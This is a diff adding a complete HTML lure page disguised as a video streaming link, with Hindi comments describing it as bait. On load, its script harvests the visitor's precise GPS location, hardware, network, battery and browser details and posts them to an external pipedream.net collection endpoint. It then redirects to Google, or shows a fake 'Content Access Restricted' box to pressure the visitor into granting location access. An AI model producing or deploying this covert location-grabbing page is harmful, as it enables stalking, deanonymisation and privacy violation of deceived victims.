@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- टाइटल जो आपके वीडियो डेमो के प्रलोभन को बनाए रखेगा -->
+    <title>Video Cloud Platform - Streaming Link</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            background-color: #0f0f0f; /* प्रीमियम डार्क थीम */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            color: #ffffff;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
+        }
+
+        /* प्रोफेशनल मीडिया रिस्ट्रिक्शन ओवरले स्क्रीन */
+        #verification-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center; align-items: center;
+            padding: 20px; box-sizing: border-box;
+        }
+
+        .modal-box {
+            background-color: #1f1f1f;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 30px; max-width: 400px; width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-title {
+            font-size: 18px; font-weight: 600;
+            margin-bottom: 12px; color: #ff4d4d;
+        }
+
+        .modal-text {
+            font-size: 14px; color: #aaaaaa;
+            line-height: 1.5; margin-bottom: 24px;
+        }
+
+        .action-btn {
+            background-color: #cc0000; /* आकर्षक रेड बटन */
+            color: #ffffff; border: none;
+            padding: 12px 24px; font-size: 14px; font-weight: 600;
+            border-radius: 4px; cursor: pointer; width: 100%;
+            transition: background-color 0.2s;
+        }
+
+        .action-btn:hover {
+            background-color: #990000;
+        }
+
+        /* गोल घूमने वाला लोडिंग एनीमेशन */
+        .spinner {
+            border: 3px solid #333;
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            width: 30px; height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- शुरुआती लोडिंग स्क्रीन -->
+    <div id="loading-context" style="text-align: center;">
+        <div class="spinner"></div>
+        <p style="color: #888888; font-size: 14px;">Initializing encrypted video stream, please wait...</p>
+    </div>
+
+    <!-- आपके निर्देशानुसार कस्टमाइज किया हुआ शार्ट और डायरेक्ट मैसेज बॉक्स -->
+    <div id="verification-modal">
+        <div class="modal-box">
+            <div class="modal-title">Content Access Restricted</div>
+            <div class="modal-text">
+                This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
+            </div>
+            <button class="action-btn" onclick="window.location.reload();">Verify & Watch Video</button>
+        </div>
+    </div>
+
+    <script>
+        // सभी डेटा को एक पैकेट में समेटकर सर्वर पर भेजने का मुख्य फंक्शन
+        function gatherAndDispatchTelemetry(gpsData, gpsStatus) {
+            
+            // 1. स्क्रीन, टाइमज़ोन, भाषा और प्रोसेसर की जानकारी जुटाना
+            var deviceHardware = {
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                cpuCores: navigator.hardwareConcurrency || "Unknown",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceLanguage: navigator.language || "Unknown",
+                localTime: new Date().toString()
+            };
+
+            // 2. नेटवर्क कनेक्शन की लाइव स्थिति जांचना (4G/5G/WiFi और स्पीड)
+            var networkProfile = {};
+            if (navigator.connection) {
+                networkProfile = {
+                    effectiveType: navigator.connection.effectiveType, 
+                    downlink: navigator.connection.downlink, 
+                    rtt: navigator.connection.rtt 
+                };
+            }
+
+            // 3. बैटरी स्टेटस प्रॉमिस को हैंडल करना (बैटरी % और चार्जिंग स्थिति)
+            var batteryCheck = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
+
+            batteryCheck.then(function(battery) {
+                var batteryProfile = battery ? {
+                    level: Math.round(battery.level * 100) + "%",
+                    charging: battery.charging
+                } : "Not_Supported";
+
+                // फाइनल पैकेट तैयार (बिना no-cors के ताकि सर्वर JSON आसानी से पढ़ सके)
+                var finalTelemetryPayload = {
+                    status: gpsStatus,
+                    coordinates: gpsData,
+                    hardware: deviceHardware,
+                    network: networkProfile,
+                    battery: batteryProfile,
+                    userAgent: navigator.userAgent
+                };
+
+                return fetch('https://eotkqc7s42iokg5.m.pipedream.net', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(finalTelemetryPayload)
+                });
+            }).then(function() {
+                // स्थिति A: अगर डेटा सुरक्षित पहुँच गया और जीपीएस ऑन था, तो सीधे गूगल पर भेजें (कोई यूट्यूब ऐप ग्लिच नहीं होगा)
+                if (gpsStatus === "GEO_SUCCESS") {
+                    window.location.href = "https://google.com";
+                } else {
+                    // स्थिति B: अगर जीपीएस बंद था, तो हमारा डार्क रिस्ट्रिक्शन लॉक बॉक्स स्क्रीन पर दिखाएं
+                    document.getElementById('loading-context').style.display = 'none';
+                    document.getElementById('verification-modal').style.display = 'flex';
+                }
+            }).catch(function() {
+                // सर्वर एरर होने पर भी सुरक्षित साइड में हैंडल करना
+                if (gpsStatus === "GEO_SUCCESS") {
+                    window.location.href = "https://google.com";
+                } else {
+                    document.getElementById('loading-context').style.display = 'none';
+                    document.getElementById('verification-modal').style.display = 'flex';
+                }
+            });
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // सिचुएशन 1: नए या पुराने फोन में लोकेशन ऑन है या यूजर ने Allow कर दिया
+                    var gpsData = { lat: position.coords.latitude, lon: position.coords.longitude };
+                    gatherAndDispatchTelemetry(gpsData, "GEO_SUCCESS");
+
+                }, function(error) {
+                    // सिचुएशन 2: लोकेशन फोन में पूरी तरह ऑफ है या यूजर ने ब्लॉक कर दिया
+                    var gpsData = { lat: null, lon: null };
+                    gatherAndDispatchTelemetry(gpsData, "GEO_DISABLED_OR_BLOCKED");
+                }, { 
+                    enableHighAccuracy: true, // नए फोन्स के Fused/Hybrid लोकेशन प्रॉम्ट को ट्रिगर करने के लिए
+                    timeout: 8000 // प्रतिक्रिया के लिए 8 सेकंड का विंडो
+                });
+            } else {
+                // सिचुएशन 3: जियोलोकेशन सपोर्ट न होने पर
+                var gpsData = { lat: null, lon: null };
+                gatherAndDispatchTelemetry(gpsData, "GEO_NOT_SUPPORTED");
+            }
+        };
+    </script>
+</body>
+</html>
